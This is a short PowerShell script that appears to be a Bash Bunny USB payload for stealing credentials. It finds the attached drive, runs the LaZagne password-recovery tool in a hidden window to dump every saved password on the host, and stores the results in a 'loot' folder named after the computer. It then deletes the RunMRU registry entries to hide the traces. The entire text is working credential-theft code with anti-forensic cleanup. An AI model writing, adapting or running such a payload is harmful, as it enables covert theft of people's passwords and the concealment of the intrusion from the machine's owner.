$drivelabel = 'BashBunny'
$volume = Get-WmiObject win32_volume -Filter "label='$drivelabel'"

if ($volume) {
    $dest = $volume.Name + 'loot\PasswordGrabber'
    $filter = 'password_' + $env:COMPUTERNAME
    $filecount = ((Get-ChildItem -Filter ($filter + "*") -Path $dest | Measure-Object).Count + 1)
    
    $toolPath = $volume.Name + 'tooling\LaZagne.exe'
    if (Test-Path $toolPath) {
        Start-Process -WindowStyle Hidden -FilePath $toolPath -ArgumentList 'all -vv' `
            -RedirectStandardOutput ($dest + '\' + $filter + '_' + $filecount + '.txt')
    } else {
        Write-Error "LaZagne.exe not found at: $toolPath"
        exit 1
    }

    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' `
        -Name '*' -ErrorAction SilentlyContinue
} else {
    Write-Error "Drive labeled '$drivelabel' not found."
    exit 1
}
